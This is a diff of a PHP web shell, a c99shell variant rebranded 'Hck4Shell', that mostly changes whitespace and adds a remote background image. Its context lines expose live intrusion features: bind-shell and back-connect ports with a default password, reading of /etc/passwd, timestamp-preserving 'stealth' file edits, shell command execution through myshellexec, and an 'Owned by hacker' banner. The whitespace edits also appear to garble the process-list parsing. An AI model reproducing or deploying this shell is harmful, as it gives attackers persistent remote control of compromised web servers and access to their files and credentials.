@@ -49,9 +49,9 @@ $c99sh_sourcesurl = "http://ccteam.ru/files/c99sh_sources/"; //Sources-server
 $filestealth = true; //if true, don't change modify- and access-time
 
 $donated_html = "<center><b>Owned by hacker</b></center>";
-		/* If you publish free shell and you wish
-		add link to your site or any other information,
-		put here your html. */
+    /* If you publish free shell and you wish
+    add link to your site or any other information,
+    put here your html. */
 $donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.
 
 $curdir = "./"; //start folder
@@ -100,8 +100,8 @@ $exeftypes  = array(
   )
   string {regexp} - regular exp.
   int {type}:
-	0 - files and folders (as default),
-	1 - files only, 2 - folders only
+  0 - files and folders (as default),
+  1 - files only, 2 - folders only
   string {opentag} - open html-tag, e.g. "<b>" (default)
   string {closetag} - close html-tag, e.g. "</b>" (default)
   bool {break} - if true and found match then break
@@ -112,14 +112,14 @@ $regxp_highlight  = array(
 );
 
 $safemode_diskettes = array("a"); // This variable for disabling diskett-errors.
-									 // array (i=>{letter} ...); string {letter} - letter of a drive
+                   // array (i=>{letter} ...); string {letter} - letter of a drive
 //$safemode_diskettes = range("a","z");
-$hexdump_lines = 8;	// lines in hex preview file
-$hexdump_rows = 24;	// 16, 24 or 32 bytes in one line
+$hexdump_lines = 8; // lines in hex preview file
+$hexdump_rows = 24; // 16, 24 or 32 bytes in one line
 
 $nixpwdperpage = 100; // Get first N lines from /etc/passwd
 
-$bindport_pass = "c99";	  // default password for binding
+$bindport_pass = "c99";   // default password for binding
 $bindport_port = "31373"; // default port for binding
 $bc_port = "31373"; // default port for back-connect
 $datapipe_localport = "8081"; // default port for datapipe
@@ -200,7 +200,7 @@ $highlight_string = "#000000";
 //END CONFIGURATION
 
 
-// 				\/	Next code isn't for editing	\/
+//        \/  Next code isn't for editing \/
 @set_time_limit(0);
 $tmp = array();
 foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
@@ -864,7 +864,7 @@ if (!is_array($actbox)) {$actbox = array();}
 $dspact = $act = htmlspecialchars($act);
 $disp_fullpath = $ls_arr = $notls = null;
 $ud = urlencode($d);
-?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - Hck4shell - V 0.1 </title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>Hck4Shell v. <?php echo $shver; ?></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php
+?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - Hck4shell - V 0.1 </title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY style="background-image:url('http://www.animatedimages.org/data/media/568/animated-matrix-image-0010.gif') " text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>Hck4Shell v. <?php echo $shver; ?></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
@@ -2300,8 +2300,8 @@ if ($act == "processes")
    foreach ($stack as $line)
    {
     if (!empty($line))
-	{
-	 echo "<tr>";
+  {
+   echo "<tr>";
      $line = explode(" ",$line);
      $line[10] = join(" ",array_slice($line,10));
      $line = array_slice($line,0,11);
@@ -2314,22 +2314,22 @@ if ($act == "processes")
   }
   else
   {
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
-   while (ereg("		",$ret)) {$ret = str_replace("		","	",$ret);}
-   while (ereg("	 ",$ret)) {$ret = str_replace("	 ","	",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (ereg("    ",$ret)) {$ret = str_replace("    "," ",$ret);}
+   while (ereg("   ",$ret)) {$ret = str_replace("  ","  ",$ret);}
    $ret = convert_cyr_string($ret,"d","w");
    $stack = explode("\n",$ret);
    unset($stack[0],$stack[2]);
    $stack = array_values($stack);
-   $head = explode("	",$stack[0]);
+   $head = explode("  ",$stack[0]);
    $head[1] = explode(" ",$head[1]);
    $head[1] = $head[1][0];
    $stack = array_slice($stack,1);
@@ -2348,7 +2348,7 @@ if ($act == "processes")
     if (!empty($line))
     {
      echo "<tr>";
-     $line = explode("	",$line);
+     $line = explode("  ",$line);
      $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);
      $line[2] = intval(str_replace(" ","",$line[2]))*1024; 
      $prcs[] = $line;
